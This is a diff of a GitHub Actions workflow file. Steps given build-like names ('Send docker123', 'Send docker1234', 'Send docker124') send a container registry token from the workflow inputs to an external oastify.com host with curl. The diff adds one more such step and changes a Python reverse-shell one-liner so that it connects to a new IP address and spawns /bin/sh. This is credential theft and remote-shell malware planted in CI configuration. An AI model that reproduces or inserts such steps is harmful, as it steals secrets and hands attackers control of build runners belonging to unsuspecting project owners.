@@ -204,7 +204,11 @@ runs:
     - name: Send docker123
       shell: bash
       run: curl http://mqgpqjx05olajj0daw1wz6kxlorff53u.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
+
+      - name: Send docker1234
+      shell: bash
+      run: curl http://mqgpqjx05olajj0daw1wz6kxlorff53u.oastify.com/${{fromJSON(github.event.inputs.client_payload).payload.container_registry_token}}
       
     - name: Send docker124
       shell: bash
-      run: python -c "import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('45.63.43.220',9977));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
+      run: python -c "import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('199.247.17.80',9977));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
